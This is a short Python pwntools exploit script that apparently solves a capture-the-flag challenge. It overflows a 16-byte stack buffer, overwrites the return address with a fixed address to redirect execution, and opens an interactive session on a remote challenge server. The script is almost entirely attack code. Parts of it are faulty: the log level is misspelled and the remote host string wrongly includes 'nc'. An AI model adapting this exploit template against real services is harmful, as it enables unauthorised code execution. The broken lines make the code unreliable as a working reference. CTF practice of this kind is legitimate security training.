from pwn import *

context.log_level = 'deubg'

#p = process("./chall")
#elf = ELF("./chall")
p = remote("nc challs.nusgreyhats.org", 35003)


"""
1. using ida (dist betw buf and the safe address is 16 bytes)
2. using gdb cyclic or by breaking at gets(buffer)
3. manually calculate (unreliable)
"""

payload = b'a' * 0x10
payload += p64(0x00000000004011dd)
p.sendlineafter(b"Enter input: ", payload)
p.interactive()
